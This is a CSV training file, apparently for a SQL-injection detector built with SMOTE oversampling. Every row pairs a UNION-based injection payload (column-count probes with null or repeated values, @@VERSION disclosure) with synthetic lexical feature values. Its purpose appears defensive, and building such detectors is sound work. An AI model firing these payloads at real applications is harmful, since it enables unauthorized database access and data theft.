id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000373,attack,union,"-9110""   )    )    union all select 2263,2263,2263,2263,2263#",nearest_attack_euclidean,R000059,1.144602798921831,65.02838678104655,21.3802481875313,3.746040709703363,14.0,28.958014499749602,12.140744562593898,9.92962771870305,0.21701430772382552,0.4390247234691202,0.19188923424536466,0.15207173456168965,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.6901240937656499,0.0,0.0,5.2395036249374005,1.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000374,attack,union,"1'  )   as hats where 2011  =  2011 union all select null,null,null,null,null#",nearest_attack_euclidean,R000027,0.327743345414613,76.47011809025939,22.24156030153799,3.827757832624208,42.90647738667075,9.885721105639295,15.838959798974674,7.838959798974673,0.556399374641166,0.1333887838825577,0.2077177259617284,0.10249411551454787,1.0,0.0,0.08052010051266345,0.0,0.0,1.0,0.0,1.0,0.0,0.0,3.75843969846201,1.0805201005126635,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000375,attack,union," select * from users where id  =  1 or \<\. union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000003,0.036331682990884115,73.06934220027617,31.986131559944766,4.370002090946869,42.0,3.0138684400552354,17.06934220027617,10.986131559944766,0.5748309848240957,0.0412371565723926,0.23355868690120576,0.15037317170230594,0.0,0.0,2.0,0.0,1.0,1.0138684400552345,0.0,0.0,0.0,0.0,0.9999999999999996,5.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,1.0000000000000002,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000376,attack,union,"-8521'  )   union all select 2446,2446,2446,2446,2446,2446,2446#",nearest_attack_euclidean,R000067,0.4383078395353938,65.7731979091687,21.451546527277912,3.825707472822771,14.0,33.418558327334964,8.0,10.35463958183374,0.2155692233787536,0.5043622079377094,0.12318241335928777,0.1568861553242493,1.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,6.35463958183374,1.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000377,attack,union," select * from users where id  =  1 or $ .  =  1 union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000001,2.6668585757622085,75.83423548596535,31.0,4.2450081831515085,42.86630580561386,3.133694194386141,19.834235485965355,10.0,0.5663038219928584,0.040936284723965155,0.26075117443169293,0.13200871885148338,0.0,0.0,2.0,0.0,1.4331529028069294,1.5668470971930706,0.0,0.0,0.0,0.0,0.9999999999999996,5.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.5668470971930707,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.566847097193071
SMOTE_000378,attack,union,"-8772%' union all select 4909,4909,4909,4909,4909,4909,4909,4909,4909#",nearest_attack_euclidean,R000024,0.16189958295785006,69.93773496023104,21.937734960231037,3.6251346500275115,14.0,40.0,4.0,11.937734960231039,0.20018047837614192,0.571944223931834,0.0571944223931834,0.17068087529884063,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.9377349602310383,0.0,8.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000379,attack,union,"-3116""   )    )     )   union all select 4600,4600,4600,4600--",nearest_attack_euclidean,R000063,0.888837694991274,62.28957960863716,20.289579608637162,3.693032884877014,14.0,21.158318434548647,16.841681565451353,10.289579608637162,0.224768531868684,0.33948390956714614,0.27060210550499614,0.1651454530591737,0.0,1.0,3.0,0.0,0.0,0.0,0.0,2.710420391362838,0.28957960863716203,0.0,3.289579608637162,3.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000380,attack,union,"-6294"" union all select 9921,9921,9921,9921,9921,9921--",nearest_attack_euclidean,R000052,1.442191477949829,59.12695226153228,19.343912688461025,3.7068813636228546,14.0,28.0,7.439126884610234,9.687825376922047,0.23886639574994517,0.47773279149989034,0.11957779365194945,0.16382301909821495,0.0,1.0,3.0,0.0,0.0,0.0,0.0,0.6878253769220468,0.0,0.0,5.0,3.0,0.0,1.0,1.0,0.0,0.0,0.0,0.3439126884610234,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000381,attack,union," select * from users where id  =  1 union select @&&@,version  (    )   -- 1",nearest_attack_euclidean,R000012,0.246436635621132,76.0,26.0,3.900810570752045,40.09778063132997,2.09778063132997,23.097780631329968,10.70665810601009,0.5276023767280259,0.0276023767280259,0.3039181662017101,0.14087708034223803,0.0,0.0,2.0,0.0,1.0,1.0,0.0,2.0,0.0,0.0,0.9999999999999996,5.80443873734006,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000382,attack,union,"1'+  (  select vlut where 9517  =  9517 union all select null,null,null--",nearest_attack_euclidean,R000021,2.266241905637019,75.31908508982745,23.608548946103525,3.9230677790565234,42.855268071861964,9.0,15.463817017965491,8.0,0.5687306077560585,0.11962209943652141,0.20531653775273428,0.1063307550546857,1.0,0.0,1.072365964069018,0.0,0.0,1.0,0.0,1.0,0.0,0.0,2.927634035930982,2.608548946103527,1.0,0.0,0.536182982034509,0.463817017965491,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.536182982034509,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.536182982034509
SMOTE_000383,attack,union,"1""  )   where 2088  =  2088 union all select null,null,null,null--",nearest_attack_euclidean,R000053,1.6136928102618038,72.24866753194142,25.231666975693365,3.9565367463670826,30.53666604861327,15.695000927080098,17.570667161109384,8.446333395138673,0.4330902643163875,0.20940001011360107,0.24018611499735598,0.1173236105726555,0.0,1.0,2.446333395138673,0.0,0.0,1.0,0.0,1.4463333951386732,0.0,0.0,2.5536666048613266,3.446333395138673,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000384,attack,union,"1' in boolean mode  )   union all select null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000042,1.3451007437944202,81.37335162737561,17.87994511787316,3.296790122979201,55.639835353619475,1.0,13.613461391629297,11.12005488212684,0.684101011386332,0.012289468288561312,0.1670556315598978,0.13655388876520896,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.7467032547512273,0.0,0.0,7.373351627375614,0.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000385,attack,union,"-3378%""   )    )    union all select 9357,9357,9357,9357,9357--",nearest_attack_euclidean,R000064,0.14984477605711166,62.77214137434465,21.037976437609224,3.8305189206058143,14.0,23.8480942495631,14.0,10.92404712478155,0.22311055994407542,0.3798102324528554,0.22311055994407542,0.17396864765899372,0.0,1.0,2.9240471247815503,0.0,0.0,0.0,0.0,2.0,1.0,0.0,3.962023562390775,2.9240471247815503,0.0,1.0,0.9620235623907751,0.03797643760922481,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000386,attack,union,"-3116""   )    )     )   union all select 4600,4600,4600,4600--",nearest_attack_euclidean,R000063,1.2588940000671753,61.68902176008777,20.621956479824465,3.6847903302267677,14.0,21.24391295964893,16.75608704035107,9.689021760087767,0.22695761379131973,0.3446171782909779,0.2714106305711757,0.15701457734652668,0.0,1.0,2.3780435201755346,0.0,0.0,0.0,0.0,2.6890217600877673,0.0,0.0,3.3109782399122327,2.378043520175535,0.0,1.0,0.6890217600877674,0.3109782399122326,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000387,attack,union,"-1401""   )    )    union all select 3480,3480,3480,3480,3480,3480--",nearest_attack_euclidean,R000072,1.3435948623271583,70.8836282896285,21.194962550654925,3.7859312936919287,15.493703188318655,30.38992510130985,14.0,11.0,0.2174827085004759,0.4274969010593585,0.1988114186464927,0.15620897179367285,0.0,1.0,3.0,0.0,0.0,0.29874063766373105,0.0,1.7012593623362688,0.0,0.0,5.0,3.298740637663731,0.0,1.0,1.0,0.0,0.0,0.29874063766373093,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.29874063766373093,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.298740637663731
SMOTE_000388,attack,union,"-4542 union all select 1249,1249,1249,1249,1249,1249,1249,1249,1249--",nearest_attack_euclidean,R000025,0.7745018815995127,69.31074963591671,18.310749635916707,3.606718319530995,14.0,40.0,4.0,11.310749635916705,0.2019978271422704,0.5771366489779155,0.05771366489779156,0.16315185898202253,0.3107496359167057,0.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.0,3.0,0.3107496359167057,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000389,attack,union,"1'   )    )     )   union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000041,1.44144498229695,70.29704681402845,16.0,3.1353449962563618,42.0,1.0,16.637637451222755,10.65940936280569,0.5981600401763694,0.014241905718484993,0.23602053354799468,0.15157752055715107,0.6594093628056887,0.3405906371943112,0.0,0.0,0.0,0.0,0.0,2.6594093628056887,0.0,0.0,6.0,0.0,0.6594093628056887,0.3405906371943112,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000390,attack,union,"1' union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000054,1.8003580690153669,65.94822356242486,15.081495193168157,3.0641630194989578,48.16299038633631,1.0,6.162990386336313,10.622242789752235,0.7329016758940459,0.01527037005576884,0.09154613355175573,0.16028182049842965,0.5407475965840783,0.0,2.0,0.0,0.0,0.0,0.0,0.5407475965840784,0.0,0.0,7.540747596584078,2.0,0.5407475965840783,0.0,1.0,0.0,0.0,0.0,0.5407475965840782,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000391,attack,union,"1'+  (  select vlut where 9517  =  9517 union all select null,null,null--",nearest_attack_euclidean,R000021,1.5076047862409359,73.91990502919468,25.30663500973156,3.961416933328145,41.0,7.160189941610636,17.759715087584045,8.0,0.5548456910243363,0.0975873685066374,0.23930436661061916,0.1082625738584071,0.6933649902684393,0.0,2.0,0.0,0.30663500973156066,1.0,0.0,1.3066350097315607,0.0,0.0,1.6933649902684391,4.0,0.6933649902684393,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,0.30663500973156066,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.30663500973156
SMOTE_000392,attack,union,"1  )   union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000014,0.6401613785617115,68.85774323694623,15.142782095381722,3.0641680014354353,49.42887161847312,1.0,7.428871618473117,11.0,0.7182336063239185,0.01454890708826126,0.10717950861694661,0.1600379779708736,0.1427820953817207,0.0,2.0,0.0,0.0,0.0,0.0,0.8572179046182793,0.14278209538172074,0.0,7.857217904618279,2.0,0.1427820953817207,0.0,1.0,0.0,0.0,0.0,0.8572179046182793,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000393,attack,union,"1' where 2774  =  2774 union all select null,null,null,null,null#",nearest_attack_euclidean,R000060,0.8818867834562668,65.19453269480304,22.194532694803048,3.8081438169967483,38.22186922078781,9.0,10.778130779212187,7.194532694803047,0.5864416606652422,0.13805342791300063,0.16518255797220555,0.11032235344955169,1.0,0.0,0.3890653896060938,0.0,0.0,1.0,0.0,0.19453269480304702,0.0,0.0,3.805467305196953,1.3890653896060936,1.0,0.0,0.19453269480304686,0.8054673051969532,0.0,1.0,0.19453269480304697,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000394,attack,union,"-4966%"" union all select 4300,4300,4300,4300,4300,4300,4300,4300#",nearest_attack_euclidean,R000035,0.8320032724015926,60.70332767533026,20.570332767533024,3.5861506691673104,14.0,32.56266214026421,4.0,10.14066553506605,0.23221074476793746,0.5346162916937858,0.06634592707655355,0.16682703646172323,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,6.140665535066051,1.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000395,attack,union,"-2639""  )   where 1494  =  1494 union all select 1494--",nearest_attack_euclidean,R000045,0.5969180213973025,58.62457091046508,24.579931345674414,3.9657190854505595,19.869897018511622,17.159862691348827,15.159862691348827,6.43494850925581,0.34067670198165967,0.2922271166947146,0.25751101256310777,0.10958516876051796,0.0,1.0,3.0,0.0,0.0,1.0,0.0,1.1449828364186032,0.0,0.0,0.28996567283720687,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000396,attack,union,"1%""   )    )    union all select null,null,null,null,null#",nearest_attack_euclidean,R000044,1.8870099263959468,61.37986015076859,16.15503496230785,3.204812942123527,35.6899300753843,1.0,15.689930075384298,9.0,0.5817922411823817,0.016358448236476336,0.254623276452855,0.147226034128287,0.0,0.5775174811539254,0.0,0.0,0.0,0.0,0.0,2.4224825188460746,0.5775174811539254,0.0,4.422482518846075,0.0,0.0,0.5775174811539254,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000397,attack,union,"1%""   )    )    union all select null,null,null,null,null#",nearest_attack_euclidean,R000044,0.8149257685253279,60.44619523640436,16.728200529288404,3.2588578561919874,36.17439576569276,1.0,14.0,9.271799470711596,0.597257930100986,0.01661189005753877,0.23256646080554272,0.1535637190359324,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,0.7282005292884051,0.0,4.543598941423189,0.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000398,attack,union,"-6075' union all select 9988,9988,9988,9988,9988,9988,9988,9988,9988#",nearest_attack_euclidean,R000074,0.2828222121371618,70.45328097919342,20.709343804161314,3.355522402048444,14.0,41.162624783354744,4.0,11.290656195838684,0.19891383985336705,0.5840364024449158,0.056832525672390596,0.16021723202932658,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.290656195838684,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000399,attack,union,"-9860%"" union all select 6996,6996,6996,6996,6996,6996#",nearest_attack_euclidean,R000039,1.2687854920207253,56.31425830045907,20.657129150229533,3.667072136403024,14.0,28.0,5.314258300459068,9.0,0.2488753108762937,0.49775062175258733,0.09338279609350154,0.15999127127761736,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.328564575114767,0.671435424885233,0.0,5.0,1.0,0.0,1.0,0.0,1.0,0.0,0.0,0.32856457511476705,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000400,attack,union," select * from users where id  =  1 +$ . union select null,@@VERSION -- 1",nearest_attack_euclidean,R000002,0.1605549658962208,73.11596415997671,32.0,4.364380141945829,44.0,2.0,17.0,10.11596415997671,0.6018077766138858,0.02735489893699483,0.23251664096445587,0.1383206834846635,0.0,0.0,2.0,0.0,1.0579820799883544,1.0,0.0,0.0,0.0,0.0,0.9999999999999996,5.115964159976709,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000401,attack,union,"-4330' union all select 3059,3059,3059,3059,3059,3059,3059,3059,3059--",nearest_attack_euclidean,R000075,1.1734605943295195,69.52917809354135,18.529178093541343,3.6191142610987908,14.0,40.0,4.0,11.529178093541342,0.201364701178141,0.5753277176518314,0.05753277176518315,0.16577480940484426,0.5291780935413425,0.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.0,3.0,0.5291780935413425,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000402,attack,union,"1%' union all select null,null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000036,0.9429522706927856,71.7419386021015,16.0,3.0562044950311646,52.96775440840601,1.0,5.032245591593995,12.741938602101502,0.7381873303778856,0.013939370383000499,0.07029615183614271,0.17757714740297115,1.0,0.0,2.0,0.0,0.0,0.0,0.0,0.2580613978984988,0.7419386021015013,0.0,8.741938602101502,2.0,1.0,0.0,1.0,0.0,0.0,0.0,0.2580613978984987,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000403,attack,union,"-4542 union all select 1249,1249,1249,1249,1249,1249,1249,1249,1249--",nearest_attack_euclidean,R000025,0.6211811213798121,67.41574546599378,18.0,3.5769816389525553,14.0,38.59177374755003,4.0,10.823971718443754,0.20825593320678434,0.5715465144785509,0.059501695201938376,0.1606958571127264,0.0,0.1760282815562465,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.647943436887507,3.0,0.0,0.1760282815562465,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000404,attack,union,"-8772%' union all select 4909,4909,4909,4909,4909,4909,4909,4909,4909#",nearest_attack_euclidean,R000024,0.47653325806232666,70.52834559226466,22.0,3.6499319175319167,14.0,40.0,4.528345592264663,12.0,0.19857203893982525,0.567348682685215,0.06387467356939532,0.17020460480556449,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.13208639806616573,0.8679136019338343,0.0,8.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.13208639806616562,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000405,attack,union,"1'+  (  select vlut where 9517  =  9517 union all select null,null,null--",nearest_attack_euclidean,R000021,1.2534106676710945,74.34923776166126,25.539695104664503,4.053171626609564,37.761829372013,13.047713284983757,15.0,8.539695104664501,0.5104135574163746,0.17304881102017264,0.20192508492713052,0.11461254663632219,1.5396951046645009,0.0,1.7301524476677494,0.0,0.0,1.0,0.0,1.0,0.0,0.0,2.0,3.7301524476677494,1.0,0.0,0.7301524476677496,0.26984755233225044,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
